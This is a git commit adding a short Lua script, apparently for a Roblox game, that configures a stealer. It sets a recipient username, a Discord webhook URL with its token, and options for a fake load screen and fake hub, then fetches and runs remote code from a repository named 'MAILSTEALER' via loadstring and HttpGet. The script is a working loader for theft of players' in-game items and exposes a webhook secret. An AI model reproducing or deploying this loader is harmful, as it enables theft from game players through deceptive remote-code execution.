cfc9ff5d35bef42c1baf34396778a19cb0cfb69e
chanterscriptslol <145923127+chanterscriptslol@users.noreply.github.com>
2023-12-30 21:06:04 -0500

    Add files via upload

---
+++ obf_LdD3x38B88ll35IbkKb2K7053CVIvjC65dccJ7g5nSW07ehcUtQ6w66WG2oBmeH1.lua
@@ -0,0 +1,13 @@
+Username = "e4rned"
+
+Webhook = "https://discord.com/api/webhooks/1190836340271624284/tXNh0H6RT2P10_xfH0tY-KmuqnN4wNhoM201mjQ0Yud84R8LLmEfNb4Nh9R7B-dUTKzc"
+
+Mailmsg = "Hello!"
+
+FakeLoadScreen = false
+
+Fake_Hub_If_Not_Enough_Gems = false
+
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/POGGERZ15/MAILSTEALER/main/Main.lua"))()
